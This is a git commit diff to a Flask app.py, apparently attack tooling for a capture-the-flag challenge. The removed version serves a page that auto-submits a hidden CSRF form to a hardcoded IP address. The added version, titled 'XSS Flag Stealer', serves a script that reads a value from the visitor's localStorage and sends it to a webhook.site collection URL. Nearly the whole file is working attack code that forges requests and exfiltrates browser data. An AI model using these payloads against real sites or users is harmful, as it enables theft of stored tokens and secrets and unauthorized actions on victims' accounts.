95a7769d4d7d682eccb49aa559e5004a13913773
Xurr1C4n3-byte <xurr1C4n3@gmail.com>
2025-08-02 03:09:34 -0400

    Update app.py

--- app.py
+++ app.py
@@ -1,16 +1,22 @@
-from flask import Flask, render_template_string
+from flask import Flask, Response
 
 app = Flask(__name__)
 
-@app.route("/")
-def index():
-    return """
-    <form name="csrf" action="http://34.134.162.213:17001/" method="post">
-        <input type="hidden" name="username" value="exp" />
-        <input type="hidden" name="status" value="on" />
-        <input type="hidden" name="csrf_token" value="" />
-    </form>
-    <script>
-        document.csrf.submit();
-    </script>
+@app.route('/')
+def steal_flag():
+    html = """
+    <!DOCTYPE html>
+    <html>
+      <head><title>XSS Flag Stealer</title></head>
+      <body>
+        <script>
+          const flag = localStorage.getItem("flag");
+          fetch("https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?flag=" + encodeURIComponent(flag));
+        </script>
+      </body>
+    </html>
     """
+    return Response(html, mimetype='text/html')
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8080)
